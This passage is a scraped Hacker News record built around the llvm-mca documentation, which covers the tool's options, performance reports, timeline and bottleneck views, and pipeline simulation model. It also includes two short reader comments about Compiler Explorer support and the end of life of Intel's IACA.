vhaddps %xmm2, %xmm2, %xmm3 ## RESOURCE interference: JFPA [ probability: 74% ] +----> 2. vhaddps %xmm3, %xmm3, %xmm4 ## REGISTER dependency: %xmm3 | | < loop carried > | +----> 1. vhaddps %xmm2, %xmm2, %xmm3 ## RESOURCE interference: JFPA [ probability: 74% ] According to the analysis, throughput is limited by resource pressure and not by data dependencies. The analysis observed increases in backend pressure during 48.07% of the simulated run. Almost all those pressure increase events were caused by contention on processor resources JFPA/JFPU0. The critical sequence is the most expensive sequence of instructions according to the simulation. It is annotated to provide extra information about critical register dependencies and resource interferences between instructions. Instructions from the critical sequence are expected to significantly impact performance. By construction, the accuracy of this analysis is strongly dependent on the simulation and (as always) by the quality of the processor model in llvm. Bottleneck analysis is currently not supported for processors with an in-order backend. Instruction Flow This section describes the instruction flow through the default pipeline of llvm-mca, as well as the functional units involved in the process. The default pipeline implements the following sequence of stages used to process instructions. Dispatch (Instruction is dispatched to the schedulers). Issue (Instruction is issued to the processor pipelines). Write Back (Instruction is executed, and results are written back). Retire (Instruction is retired; writes are architecturally committed). The in-order pipeline implements the following sequence of stages: * InOrderIssue (Instruction is issued to the processor pipelines). * Retire (Instruction is retired; writes are architecturally committed). llvm-mca assumes that instructions have all been decoded and placed into a queue before the simulation start. Therefore, the instruction fetch and decode stages are not modeled. Performance bottlenecks in the frontend are not diagnosed. Also, llvm-mca does not model branch prediction. Instruction Dispatch During the dispatch stage, instructions are picked in program order from a queue of already decoded instructions, and dispatched in groups to the simulated hardware schedulers. The size of a dispatch group depends on the availability of the simulated hardware resources. The processor dispatch width defaults to the value of the IssueWidth in LLVMs scheduling model. An instruction can be dispatched if: The size of the dispatch group is smaller than processors dispatch width. There are enough entries in the reorder buffer. There are enough physical registers to do register renaming. The schedulers are not full. Scheduling models can optionally specify which register files are available on the processor. llvm-mca uses that information to initialize register file descriptors. Users can limit the number of physical registers that are globally available for register renaming by using the command option -register-file-size. A value of zero for this option means unbounded. By knowing how many registers are available for renaming, the tool can predict dispatch stalls caused by the lack of physical registers. The number of reorder buffer entries consumed by an instruction depends on the number of micro-opcodes specified for that instruction by the target scheduling model. The reorder buffer is responsible for tracking the progress of instructions that are in-flight, and retiring them in program order. The number of entries in the reorder buffer defaults to the value specified by field MicroOpBufferSize in the target scheduling model. Instructions that are dispatched to the schedulers consume scheduler buffer entries. llvm-mca queries the scheduling model to determine the set of buffered resources consumed by an instruction. Buffered resources are treated like scheduler resources. Instruction Issue Each processor scheduler implements a buffer of instructions. An instruction has to wait in the schedulers buffer until input register operands become available. Only at that point, does the instruction becomes eligible for execution and may be issued (potentially out-of-order) for execution. Instruction latencies are computed by llvm-mca with the help of the scheduling model. llvm-mcas scheduler is designed to simulate multiple processor schedulers. The scheduler is responsible for tracking data dependencies, and dynamically selecting which processor resources are consumed by instructions. It delegates the management of processor resource units and resource groups to a resource manager. The resource manager is responsible for selecting resource units that are consumed by instructions. For example, if an instruction consumes 1cy of a resource group, the resource manager selects one of the available units from the group; by default, the resource manager uses a round-robin selector to guarantee that resource usage is uniformly distributed between all units of a group. llvm-mcas scheduler internally groups instructions into three sets: WaitSet: a set of instructions whose operands are not ready. ReadySet: a set of instructions ready to execute. IssuedSet: a set of instructions executing. Depending on the operands availability, instructions that are dispatched to the scheduler are either placed into the WaitSet or into the ReadySet. Every cycle, the scheduler checks if instructions can be moved from the WaitSet to the ReadySet, and if instructions from the ReadySet can be issued to the underlying pipelines. The algorithm prioritizes older instructions over younger instructions. Write-Back and Retire Stage Issued instructions are moved from the ReadySet to the IssuedSet. There, instructions wait until they reach the write-back stage. At that point, they get removed from the queue and the retire control unit is notified. When instructions are executed, the retire control unit flags the instruction as ready to retire. Instructions are retired in program order. The register file is notified of the retirement so that it can free the physical registers that were allocated for the instruction during the register renaming stage. Load/Store Unit and Memory Consistency Model To simulate an out-of-order execution of memory operations, llvm-mca utilizes a simulated load/store unit (LSUnit) to simulate the speculative execution of loads and stores. Each load (or store) consumes an entry in the load (or store) queue. Users can specify flags -lqueue and -squeue to limit the number of entries in the load and store queues respectively. The queues are unbounded by default. The LSUnit implements a relaxed consistency model for memory loads and stores. The rules are: A younger load is allowed to pass an older load only if there are no intervening stores or barriers between the two loads. A younger load is allowed to pass an older store provided that the load does not alias with the store. A younger store is not allowed to pass an older store. A younger store is not allowed to pass an older load. By default, the LSUnit optimistically assumes that loads do not alias (-noalias=true) store operations. Under this assumption, younger loads are always allowed to pass older stores. Essentially, the LSUnit does not attempt to run any alias analysis to predict when loads and stores do not alias with each other. Note that, in the case of write-combining memory, rule 3 could be relaxed to allow reordering of non-aliasing store operations. That being said, at the moment, there is no way to further relax the memory model (-noalias is the only option). Essentially, there is no option to specify a different memory type (e.g., write-back, write-combining, write-through; etc.) and consequently to weaken, or strengthen, the memory model. Other limitations are: The LSUnit does not know when store-to-load forwarding may occur. The LSUnit does not know anything about cache hierarchy and memory types. The LSUnit does not know how to identify serializing operations and memory fences. The LSUnit does not attempt to predict if a load or store hits or misses the L1 cache. It only knows if an instruction MayLoad and/or MayStore. For loads, the scheduling model provides an optimistic load-to-use latency (which usually matches the load-to-use latency for when there is a hit in the L1D). llvm-mca does not know about serializing operations or memory-barrier like instructions. The LSUnit conservatively assumes that an instruction which has both MayLoad and unmodeled side effects behaves like a soft load-barrier. That means, it serializes loads without forcing a flush of the load queue. Similarly, instructions that MayStore and have unmodeled side effects are treated like store barriers. A full memory barrier is a MayLoad and MayStore instruction with unmodeled side effects. This is inaccurate, but it is the best that we can do at the moment with the current information available in LLVM. A load/store barrier consumes one entry of the load/store queue. A load/store barrier enforces ordering of loads/stores. A younger load cannot pass a load barrier. Also, a younger store cannot pass a store barrier. A younger load has to wait for the memory/load barrier to execute. A load/store barrier is executed when it becomes the oldest entry in the load/store queue(s). That also means, by construction, all of the older loads/stores have been executed. In conclusion, the full set of load/store consistency rules are: A store may not pass a previous store. A store may not pass a previous load (regardless of -noalias). A store has to wait until an older store barrier is fully executed. A load may pass a previous load. A load may not pass a previous store unless -noalias is set. A load has to wait until an older load barrier is fully executed. In-order Issue and Execute In-order processors are modelled as a single InOrderIssueStage stage. It bypasses Dispatch, Scheduler and Load/Store unit. Instructions are issued as soon as their operand registers are available and resource requirements are met. Multiple instructions can be issued in one cycle according to the value of the IssueWidth parameter in LLVMs scheduling model. Once issued, an instruction is moved to IssuedInst set until it is ready to retire. llvm-mca ensures that writes are committed in-order. However, an instruction is allowed to commit writes and retire out-of-order if RetireOOO property is true for at least one of its writes. Custom Behaviour Due to certain instructions not being expressed perfectly within their scheduling model, llvm-mca isnt always able to simulate them perfectly. Modifying the scheduling model isnt always a viable option though (maybe because the instruction is modeled incorrectly on purpose or the instructions behaviour is quite complex). The CustomBehaviour class can be used in these cases to enforce proper instruction modeling (often by customizing data dependencies and detecting hazards that llvm-mca has no way of knowing about). llvm-mca comes with one generic and multiple target specific CustomBehaviour classes. The generic class will be used if the -disable-cb flag is used or if a target specific CustomBehaviour class doesnt exist for that target. (The generic class does nothing.) Currently, the CustomBehaviour class is only a part of the in-order pipeline, but there are plans to add it to the out-of-order pipeline in the future. CustomBehaviours main method is checkCustomHazard() which uses the current instruction and a list of all instructions still executing within the pipeline to determine if the current instruction should be dispatched. As output, the method returns an integer representing the number of cycles that the current instruction must stall for (this can be an underestimate if you dont know the exact number and a value of 0 represents no stall). If youd like to add a CustomBehaviour class for a target that doesnt already have one, refer to an existing implementation to see how to set it up. The classes are implemented within the target specific backend (for example /llvm/lib/Target/AMDGPU/MCA/) so that they can access backend symbols. Custom Views llvm-mca comes with several Views such as the Timeline View and Summary View. These Views are generic and can work with most (if not all) targets. If you wish to add a new View to llvm-mca and it does not require any backend functionality that is not already exposed through MC layer classes (MCSubtargetInfo, MCInstrInfo, etc.), please add it to the /tools/llvm-mca/View/ directory. However, if your new View is target specific AND requires unexposed backend symbols or functionality, you can define it in the /lib/Target/<TargetName>/MCA/ directory. To enable this target specific View, you will have to use this targets CustomBehaviour class to override the CustomBehaviour::getViews() methods. There are 3 variations of these methods based on where you want your View to appear in the output: getStartViews(), getPostInstrInfoViews(), and getEndViews(). These methods returns a vector of Views so you will want to return a vector containing all of the target specific Views for the target in question. Because these target specific (and backend dependent) Views require the CustomBehaviour::getViews() variants, these Views will not be enabled if the -disable-cb flag is used. Enabling these custom Views does not affect the non-custom (generic) Views. Continue to use the usual command line arguments to enable / disable those Views. ",
          "This is supported today in compiler explorer (<a href=\"https://godbolt.org\" rel=\"nofollow\">https://godbolt.org</a>, if you haven't played with it). Just choose a recent clang compiler and hit \"add tool\"->\"LLVM mca\".",
          "On a related note I just found that Intel has EOL'ed their IACA recently:<p><i>April 2019: Intel® Architecture Code Analyzer has reached its End Of Life. Users may want to try LLVM-MCA. This is NOT a recommendation to use LLVM-MCA nor a comment on its accuracy or usefulness. Thanks for being faithful users of Intel Architecture Code Analyzer throughout the years. We hope it was useful for you.</i><p>From: <a href=\"https://software.intel.com/en-us/articles/intel-architecture-code-analyzer\" rel=\"nofollow\">https://software.intel.com/en-us/articles/intel-architecture...</a>"
        ],
        "story_type": ["Normal"],
        "url": "https://llvm.org/docs/CommandGuide/llvm-mca.html",
        "comments.comment_id": [19813582, 19814592],
        "comments.comment_author": ["debatem1", "d99kris"],
        "comments.comment_descendants": [1, 0],
        "comments.comment_time": [
          "2019-05-02T22:28:49Z",
          "2019-05-03T01:13:30Z"
        ],
        "comments.comment_text": [
          "This is supported today in compiler explorer (<a href=\"https://godbolt.org\" rel=\"nofollow\">https://godbolt.org</a>, if you haven't played with it). Just choose a recent clang compiler and hit \"add tool\"->\"LLVM mca\".",
          "On a related note I just found that Intel has EOL'ed their IACA recently:<p><i>April 2019: Intel® Architecture Code Analyzer has reached its End Of Life. Users may want to try LLVM-MCA. This is NOT a recommendation to use LLVM-MCA nor a comment on its accuracy or usefulness. Thanks for being faithful users of Intel Architecture Code Analyzer throughout the years. We hope it was useful for you.</i><p>From: <a href=\"https://software.intel.com/en-us/articles/intel-architecture-code-analyzer\" rel=\"nofollow\">https://software.intel.com/en-us/articles/intel-architecture...</a>"
        ],
        "id": "ee484999-2012-4bb6-ac0d-87ba4ba09e88",
        "url_text": "SYNOPSIS llvm-mca [options] [input] DESCRIPTION llvm-mca is a performance analysis tool that uses information available in LLVM (e.g. scheduling models) to statically measure the performance of machine code in a specific CPU. Performance is measured in terms of throughput as well as processor resource consumption. The tool currently works for processors with a backend for which there is a scheduling model available in LLVM. The main goal of this tool is not just to predict the performance of the code when run on the target, but also help with diagnosing potential performance issues. Given an assembly code sequence, llvm-mca estimates the Instructions Per Cycle (IPC), as well as hardware resource pressure. The analysis and reporting style were inspired by the IACA tool from Intel. For example, you can compile code with clang, output assembly, and pipe it directly into llvm-mca for analysis: $ clang foo.c -O2 -target x86_64-unknown-unknown -S -o - | llvm-mca -mcpu=btver2 Or for Intel syntax: $ clang foo.c -O2 -target x86_64-unknown-unknown -mllvm -x86-asm-syntax=intel -S -o - | llvm-mca -mcpu=btver2 (llvm-mca detects Intel syntax by the presence of an .intel_syntax directive at the beginning of the input. By default its output syntax matches that of its input.) Scheduling models are not just used to compute instruction latencies and throughput, but also to understand what processor resources are available and how to simulate them. By design, the quality of the analysis conducted by llvm-mca is inevitably affected by the quality of the scheduling models in LLVM. If you see that the performance report is not accurate for a processor, please file a bug against the appropriate backend. OPTIONS If input is - or omitted, llvm-mca reads from standard input. Otherwise, it will read from the specified filename. If the -o option is omitted, then llvm-mca will send its output to standard output if the input is from standard input. If the -o option specifies -, then the output will also be sent to standard output. -help Print a summary of command line options. -o <filename> Use <filename> as the output filename. See the summary above for more details. -mtriple=<target triple> Specify a target triple string. -march=<arch> Specify the architecture for which to analyze the code. It defaults to the host default target. -mcpu=<cpuname> Specify the processor for which to analyze the code. By default, the cpu name is autodetected from the host. -output-asm-variant=<variant id> Specify the output assembly variant for the report generated by the tool. On x86, possible values are [0, 1]. A value of 0 (vic. 1) for this flag enables the AT&T (vic. Intel) assembly format for the code printed out by the tool in the analysis report. -print-imm-hex Prefer hex format for numeric literals in the output assembly printed as part of the report. -dispatch=<width> Specify a different dispatch width for the processor. The dispatch width defaults to field IssueWidth in the processor scheduling model. If width is zero, then the default dispatch width is used. -register-file-size=<size> Specify the size of the register file. When specified, this flag limits how many physical registers are available for register renaming purposes. A value of zero for this flag means unlimited number of physical registers. -iterations=<number of iterations> Specify the number of iterations to run. If this flag is set to 0, then the tool sets the number of iterations to a default value (i.e. 100). -noalias=<bool> If set, the tool assumes that loads and stores dont alias. This is the default behavior. -lqueue=<load queue size> Specify the size of the load queue in the load/store unit emulated by the tool. By default, the tool assumes an unbound number of entries in the load queue. A value of zero for this flag is ignored, and the default load queue size is used instead. -squeue=<store queue size> Specify the size of the store queue in the load/store unit emulated by the tool. By default, the tool assumes an unbound number of entries in the store queue. A value of zero for this flag is ignored, and the default store queue size is used instead. -timeline Enable the timeline view. -timeline-max-iterations=<iterations> Limit the number of iterations to print in the timeline view. By default, the timeline view prints information for up to 10 iterations. -timeline-max-cycles=<cycles> Limit the number of cycles in the timeline view, or use 0 for no limit. By default, the number of cycles is set to 80. -resource-pressure Enable the resource pressure view. This is enabled by default. -register-file-stats Enable register file usage statistics. -dispatch-stats Enable extra dispatch statistics. This view collects and analyzes instruction dispatch events, as well as static/dynamic dispatch stall events. This view is disabled by default. -scheduler-stats Enable extra scheduler statistics. This view collects and analyzes instruction issue events. This view is disabled by default. -retire-stats Enable extra retire control unit statistics. This view is disabled by default. -instruction-info Enable the instruction info view. This is enabled by default. -show-encoding Enable the printing of instruction encodings within the instruction info view. -all-stats Print all hardware statistics. This enables extra statistics related to the dispatch logic, the hardware schedulers, the register file(s), and the retire control unit. This option is disabled by default. -all-views Enable all the view. -instruction-tables Prints resource pressure information based on the static information available from the processor model. This differs from the resource pressure view because it doesnt require that the code is simulated. It instead prints the theoretical uniform distribution of resource pressure for every instruction in sequence. -bottleneck-analysis Print information about bottlenecks that affect the throughput. This analysis can be expensive, and it is disabled by default. Bottlenecks are highlighted in the summary view. Bottleneck analysis is currently not supported for processors with an in-order backend. -json Print the requested views in valid JSON format. The instructions and the processor resources are printed as members of special top level JSON objects. The individual views refer to them by index. However, not all views are currently supported. For example, the report from the bottleneck analysis is not printed out in JSON. All the default views are currently supported. -disable-cb Force usage of the generic CustomBehaviour and InstrPostProcess classes rather than using the target specific implementation. The generic classes never detect any custom hazards or make any post processing modifications to instructions. EXIT STATUS llvm-mca returns 0 on success. Otherwise, an error message is printed to standard error, and the tool returns 1. USING MARKERS TO ANALYZE SPECIFIC CODE BLOCKS llvm-mca allows for the optional usage of special code comments to mark regions of the assembly code to be analyzed. A comment starting with substring LLVM-MCA-BEGIN marks the beginning of a code region. A comment starting with substring LLVM-MCA-END marks the end of a code region. For example: # LLVM-MCA-BEGIN ... # LLVM-MCA-END If no user-defined region is specified, then llvm-mca assumes a default region which contains every instruction in the input file. Every region is analyzed in isolation, and the final performance report is the union of all the reports generated for every code region. Code regions can have names. For example: # LLVM-MCA-BEGIN A simple example add %eax, %eax # LLVM-MCA-END The code from the example above defines a region named A simple example with a single instruction in it. Note how the region name doesnt have to be repeated in the LLVM-MCA-END directive. In the absence of overlapping regions, an anonymous LLVM-MCA-END directive always ends the currently active user defined region. Example of nesting regions: # LLVM-MCA-BEGIN foo add %eax, %edx # LLVM-MCA-BEGIN bar sub %eax, %edx # LLVM-MCA-END bar # LLVM-MCA-END foo Example of overlapping regions: # LLVM-MCA-BEGIN foo add %eax, %edx # LLVM-MCA-BEGIN bar sub %eax, %edx # LLVM-MCA-END foo add %eax, %edx # LLVM-MCA-END bar Note that multiple anonymous regions cannot overlap. Also, overlapping regions cannot have the same name. There is no support for marking regions from high-level source code, like C or C++. As a workaround, inline assembly directives may be used: int foo(int a, int b) { __asm volatile(\"# LLVM-MCA-BEGIN foo\"); a += 42; __asm volatile(\"# LLVM-MCA-END\"); a *= b; return a; } However, this interferes with optimizations like loop vectorization and may have an impact on the code generated. This is because the __asm statements are seen as real code having important side effects, which limits how the code around them can be transformed. If users want to make use of inline assembly to emit markers, then the recommendation is to always verify that the output assembly is equivalent to the assembly generated in the absence of markers. The Clang options to emit optimization reports can also help in detecting missed optimizations. HOW LLVM-MCA WORKS llvm-mca takes assembly code as input. The assembly code is parsed into a sequence of MCInst with the help of the existing LLVM target assembly parsers. The parsed sequence of MCInst is then analyzed by a Pipeline module to generate a performance report. The Pipeline module simulates the execution of the machine code sequence in a loop of iterations (default is 100). During this process, the pipeline collects a number of execution related statistics. At the end of this process, the pipeline generates and prints a report from the collected statistics. Here is an example of a performance report generated by the tool for a dot-product of two packed float vectors of four elements. The analysis is conducted for target x86, cpu btver2. The following result can be produced via the following command using the example located at test/tools/llvm-mca/X86/BtVer2/dot-product.s: $ llvm-mca -mtriple=x86_64-unknown-unknown -mcpu=btver2 -iterations=300 dot-product.s Iterations: 300 Instructions: 900 Total Cycles: 610 Total uOps: 900 Dispatch Width: 2 uOps Per Cycle: 1.48 IPC: 1.48 Block RThroughput: 2.0 Instruction Info: [1]: #uOps [2]: Latency [3]: RThroughput [4]: MayLoad [5]: MayStore [6]: HasSideEffects (U) [1] [2] [3] [4] [5] [6] Instructions: 1 2 1.00 vmulps %xmm0, %xmm1, %xmm2 1 3 1.00 vhaddps %xmm2, %xmm2, %xmm3 1 3 1.00 vhaddps %xmm3, %xmm3, %xmm4 Resources: [0] - JALU0 [1] - JALU1 [2] - JDiv [3] - JFPA [4] - JFPM [5] - JFPU0 [6] - JFPU1 [7] - JLAGU [8] - JMul [9] - JSAGU [10] - JSTC [11] - JVALU0 [12] - JVALU1 [13] - JVIMUL Resource pressure per iteration: [0] [1] [2] [3] [4] [5] [6] [7] [8] [9] [10] [11] [12] [13] - - - 2.00 1.00 2.00 1.00 - - - - - - - Resource pressure by instruction: [0] [1] [2] [3] [4] [5] [6] [7] [8] [9] [10] [11] [12] [13] Instructions: - - - - 1.00 - 1.00 - - - - - - - vmulps %xmm0, %xmm1, %xmm2 - - - 1.00 - 1.00 - - - - - - - - vhaddps %xmm2, %xmm2, %xmm3 - - - 1.00 - 1.00 - - - - - - - - vhaddps %xmm3, %xmm3, %xmm4 According to this report, the dot-product kernel has been executed 300 times, for a total of 900 simulated instructions. The total number of simulated micro opcodes (uOps) is also 900. The report is structured in three main sections. The first section collects a few performance numbers; the goal of this section is to give a very quick overview of the performance throughput. Important performance indicators are IPC, uOps Per Cycle, and Block RThroughput (Block Reciprocal Throughput). Field DispatchWidth is the maximum number of micro opcodes that are dispatched to the out-of-order backend every simulated cycle. For processors with an in-order backend, DispatchWidth is the maximum number of micro opcodes issued to the backend every simulated cycle. IPC is computed dividing the total number of simulated instructions by the total number of cycles. Field Block RThroughput is the reciprocal of the block throughput. Block throughput is a theoretical quantity computed as the maximum number of blocks (i.e. iterations) that can be executed per simulated clock cycle in the absence of loop carried dependencies. Block throughput is superiorly limited by the dispatch rate, and the availability of hardware resources. In the absence of loop-carried data dependencies, the observed IPC tends to a theoretical maximum which can be computed by dividing the number of instructions of a single iteration by the Block RThroughput. Field uOps Per Cycle is computed dividing the total number of simulated micro opcodes by the total number of cycles. A delta between Dispatch Width and this field is an indicator of a performance issue. In the absence of loop-carried data dependencies, the observed uOps Per Cycle should tend to a theoretical maximum throughput which can be computed by dividing the number of uOps of a single iteration by the Block RThroughput. Field uOps Per Cycle is bounded from above by the dispatch width. That is because the dispatch width limits the maximum size of a dispatch group. Both IPC and uOps Per Cycle are limited by the amount of hardware parallelism. The availability of hardware resources affects the resource pressure distribution, and it limits the number of instructions that can be executed in parallel every cycle. A delta between Dispatch Width and the theoretical maximum uOps per Cycle (computed by dividing the number of uOps of a single iteration by the Block RThroughput) is an indicator of a performance bottleneck caused by the lack of hardware resources. In general, the lower the Block RThroughput, the better. In this example, uOps per iteration/Block RThroughput is 1.50. Since there are no loop-carried dependencies, the observed uOps Per Cycle is expected to approach 1.50 when the number of iterations tends to infinity. The delta between the Dispatch Width (2.00), and the theoretical maximum uOp throughput (1.50) is an indicator of a performance bottleneck caused by the lack of hardware resources, and the Resource pressure view can help to identify the problematic resource usage. The second section of the report is the instruction info view. It shows the latency and reciprocal throughput of every instruction in the sequence. It also reports extra information related to the number of micro opcodes, and opcode properties (i.e., MayLoad, MayStore, and HasSideEffects). Field RThroughput is the reciprocal of the instruction throughput. Throughput is computed as the maximum number of instructions of a same type that can be executed per clock cycle in the absence of operand dependencies. In this example, the reciprocal throughput of a vector float multiply is 1 cycles/instruction. That is because the FP multiplier JFPM is only available from pipeline JFPU1. Instruction encodings are displayed within the instruction info view when flag -show-encoding is specified. Below is an example of -show-encoding output for the dot-product kernel: Instruction Info: [1]: #uOps [2]: Latency [3]: RThroughput [4]: MayLoad [5]: MayStore [6]: HasSideEffects (U) [7]: Encoding Size [1] [2] [3] [4] [5] [6] [7] Encodings: Instructions: 1 2 1.00 4 c5 f0 59 d0 vmulps %xmm0, %xmm1, %xmm2 1 4 1.00 4 c5 eb 7c da vhaddps %xmm2, %xmm2, %xmm3 1 4 1.00 4 c5 e3 7c e3 vhaddps %xmm3, %xmm3, %xmm4 The Encoding Size column shows the size in bytes of instructions. The Encodings column shows the actual instruction encodings (byte sequences in hex). The third section is the Resource pressure view. This view reports the average number of resource cycles consumed every iteration by instructions for every processor resource unit available on the target. Information is structured in two tables. The first table reports the number of resource cycles spent on average every iteration. The second table correlates the resource cycles to the machine instruction in the sequence. For example, every iteration of the instruction vmulps always executes on resource unit [6] (JFPU1 - floating point pipeline #1), consuming an average of 1 resource cycle per iteration. Note that on AMD Jaguar, vector floating-point multiply can only be issued to pipeline JFPU1, while horizontal floating-point additions can only be issued to pipeline JFPU0. The resource pressure view helps with identifying bottlenecks caused by high usage of specific hardware resources. Situations with resource pressure mainly concentrated on a few resources should, in general, be avoided. Ideally, pressure should be uniformly distributed between multiple resources. Timeline View The timeline view produces a detailed report of each instructions state transitions through an instruction pipeline. This view is enabled by the command line option -timeline. As instructions transition through the various stages of the pipeline, their states are depicted in the view report. These states are represented by the following characters: D : Instruction dispatched. e : Instruction executing. E : Instruction executed. R : Instruction retired. = : Instruction already dispatched, waiting to be executed. - : Instruction executed, waiting to be retired. Below is the timeline view for a subset of the dot-product example located in test/tools/llvm-mca/X86/BtVer2/dot-product.s and processed by llvm-mca using the following command: $ llvm-mca -mtriple=x86_64-unknown-unknown -mcpu=btver2 -iterations=3 -timeline dot-product.s Timeline view: 012345 Index 0123456789 [0,0] DeeER. . . vmulps %xmm0, %xmm1, %xmm2 [0,1] D==eeeER . . vhaddps %xmm2, %xmm2, %xmm3 [0,2] .D====eeeER . vhaddps %xmm3, %xmm3, %xmm4 [1,0] .DeeE-----R . vmulps %xmm0, %xmm1, %xmm2 [1,1] . D=eeeE---R . vhaddps %xmm2, %xmm2, %xmm3 [1,2] . D====eeeER . vhaddps %xmm3, %xmm3, %xmm4 [2,0] . DeeE-----R . vmulps %xmm0, %xmm1, %xmm2 [2,1] . D====eeeER . vhaddps %xmm2, %xmm2, %xmm3 [2,2] . D======eeeER vhaddps %xmm3, %xmm3, %xmm4 Average Wait times (based on the timeline view): [0]: Executions [1]: Average time spent waiting in a scheduler's queue [2]: Average time spent waiting in a scheduler's queue while ready [3]: Average time elapsed from WB until retire stage [0] [1] [2] [3] 0. 3 1.0 1.0 3.3 vmulps %xmm0, %xmm1, %xmm2 1. 3 3.3 0.7 1.0 vhaddps %xmm2, %xmm2, %xmm3 2. 3 5.7 0.0 0.0 vhaddps %xmm3, %xmm3, %xmm4 3 3.3 0.5 1.4 <total> The timeline view is interesting because it shows instruction state changes during execution. It also gives an idea of how the tool processes instructions executed on the target, and how their timing information might be calculated. The timeline view is structured in two tables. The first table shows instructions changing state over time (measured in cycles); the second table (named Average Wait times) reports useful timing statistics, which should help diagnose performance bottlenecks caused by long data dependencies and sub-optimal usage of hardware resources. An instruction in the timeline view is identified by a pair of indices, where the first index identifies an iteration, and the second index is the instruction index (i.e., where it appears in the code sequence). Since this example was generated using 3 iterations: -iterations=3, the iteration indices range from 0-2 inclusively. Excluding the first and last column, the remaining columns are in cycles. Cycles are numbered sequentially starting from 0. From the example output above, we know the following: Instruction [1,0] was dispatched at cycle 1. Instruction [1,0] started executing at cycle 2. Instruction [1,0] reached the write back stage at cycle 4. Instruction [1,0] was retired at cycle 10. Instruction [1,0] (i.e., vmulps from iteration #1) does not have to wait in the schedulers queue for the operands to become available. By the time vmulps is dispatched, operands are already available, and pipeline JFPU1 is ready to serve another instruction. So the instruction can be immediately issued on the JFPU1 pipeline. That is demonstrated by the fact that the instruction only spent 1cy in the schedulers queue. There is a gap of 5 cycles between the write-back stage and the retire event. That is because instructions must retire in program order, so [1,0] has to wait for [0,2] to be retired first (i.e., it has to wait until cycle 10). In the example, all instructions are in a RAW (Read After Write) dependency chain. Register %xmm2 written by vmulps is immediately used by the first vhaddps, and register %xmm3 written by the first vhaddps is used by the second vhaddps. Long data dependencies negatively impact the ILP (Instruction Level Parallelism). In the dot-product example, there are anti-dependencies introduced by instructions from different iterations. However, those dependencies can be removed at register renaming stage (at the cost of allocating register aliases, and therefore consuming physical registers). Table Average Wait times helps diagnose performance issues that are caused by the presence of long latency instructions and potentially long data dependencies which may limit the ILP. Last row, <total>, shows a global average over all instructions measured. Note that llvm-mca, by default, assumes at least 1cy between the dispatch event and the issue event. When the performance is limited by data dependencies and/or long latency instructions, the number of cycles spent while in the ready state is expected to be very small when compared with the total number of cycles spent in the schedulers queue. The difference between the two counters is a good indicator of how large of an impact data dependencies had on the execution of the instructions. When performance is mostly limited by the lack of hardware resources, the delta between the two counters is small. However, the number of cycles spent in the queue tends to be larger (i.e., more than 1-3cy), especially when compared to other low latency instructions. Bottleneck Analysis The -bottleneck-analysis command line option enables the analysis of performance bottlenecks. This analysis is potentially expensive. It attempts to correlate increases in backend pressure (caused by pipeline resource pressure and data dependencies) to dynamic dispatch stalls. Below is an example of -bottleneck-analysis output generated by llvm-mca for 500 iterations of the dot-product example on btver2. Cycles with backend pressure increase [ 48.07% ] Throughput Bottlenecks: Resource Pressure [ 47.77% ] - JFPA [ 47.77% ] - JFPU0 [ 47.77% ] Data Dependencies: [ 0.30% ] - Register Dependencies [ 0.30% ] - Memory Dependencies [ 0.00% ] Critical sequence based on the simulation: Instruction Dependency Information +----< 2. vhaddps %xmm3, %xmm3, %xmm4 | | < loop carried > | | 0. vmulps %xmm0, %xmm1, %xmm2 +----> 1. vhaddps %xmm2, %xmm2, %xmm3 ## RESOURCE interference: JFPA [ probability: 74% ] +----> 2. vhaddps %xmm3, %xmm3, %xmm4 ## REGISTER dependency: %xmm3 | | < loop carried > | +----> 1. vhaddps %xmm2, %xmm2, %xmm3 ## RESOURCE interference: JFPA [ probability: 74% ] According to the analysis, throughput is limited by resource pressure and not by data dependencies. The analysis observed increases in backend pressure during 48.07% of the simulated run. Almost all those pressure increase events were caused by contention on processor resources JFPA/JFPU0. The critical sequence is the most expensive sequence of instructions according to the simulation. It is annotated to provide extra information about critical register dependencies and resource interferences between instructions. Instructions from the critical sequence are expected to significantly impact performance. By construction, the accuracy of this analysis is strongly dependent on the simulation and (as always) by the quality of the processor model in llvm. Bottleneck analysis is currently not supported for processors with an in-order backend. Instruction Flow This section describes the instruction flow through the default pipeline of llvm-mca, as well as the functional units involved in the process. The default pipeline implements the following sequence of stages used to process instructions. Dispatch (Instruction is dispatched to the schedulers). Issue (Instruction is issued to the processor pipelines). Write Back (Instruction is executed, and results are written back). Retire (Instruction is retired; writes are architecturally committed). The in-order pipeline implements the following sequence of stages: * InOrderIssue (Instruction is issued to the processor pipelines). * Retire (Instruction is retired; writes are architecturally committed). llvm-mca assumes that instructions have all been decoded and placed into a queue before the simulation start. Therefore, the instruction fetch and decode stages are not modeled. Performance bottlenecks in the frontend are not diagnosed. Also, llvm-mca does not model branch prediction. Instruction Dispatch During the dispatch stage, instructions are picked in program order from a queue of already decoded instructions, and dispatched in groups to the simulated hardware schedulers. The size of a dispatch group depends on the availability of the simulated hardware resources. The processor dispatch width defaults to the value of the IssueWidth in LLVMs scheduling model. An instruction can be dispatched if: The size of the dispatch group is smaller than processors dispatch width. There are enough entries in the reorder buffer. There are enough physical registers to do register renaming. The schedulers are not full. Scheduling models can optionally specify which register files are available on the processor. llvm-mca uses that information to initialize register file descriptors. Users can limit the number of physical registers that are globally available for register renaming by using the command option -register-file-size. A value of zero for this option means unbounded. By knowing how many registers are available for renaming, the tool can predict dispatch stalls caused by the lack of physical registers. The number of reorder buffer entries consumed by an instruction depends on the number of micro-opcodes specified for that instruction by the target scheduling model. The reorder buffer is responsible for tracking the progress of instructions that are in-flight, and retiring them in program order. The number of entries in the reorder buffer defaults to the value specified by field MicroOpBufferSize in the target scheduling model. Instructions that are dispatched to the schedulers consume scheduler buffer entries. llvm-mca queries the scheduling model to determine the set of buffered resources consumed by an instruction. Buffered resources are treated like scheduler resources. Instruction Issue Each processor scheduler implements a buffer of instructions. An instruction has to wait in the schedulers buffer until input register operands become available. Only at that point, does the instruction becomes eligible for execution and may be issued (potentially out-of-order) for execution. Instruction latencies are computed by llvm-mca with the help of the scheduling model. llvm-mcas scheduler is designed to simulate multiple processor schedulers. The scheduler is responsible for tracking data dependencies, and dynamically selecting which processor resources are consumed by instructions. It delegates the management of processor resource units and resource groups to a resource manager. The resource manager is responsible for selecting resource units that are consumed by instructions. For example, if an instruction consumes 1cy of a resource group, the resource manager selects one of the available units from the group; by default, the resource manager uses a round-robin selector to guarantee that resource usage is uniformly distributed between all units of a group. llvm-mcas scheduler internally groups instructions into three sets: WaitSet: a set of instructions whose operands are not ready. ReadySet: a set of instructions ready to execute. IssuedSet: a set of instructions executing. Depending on the operands 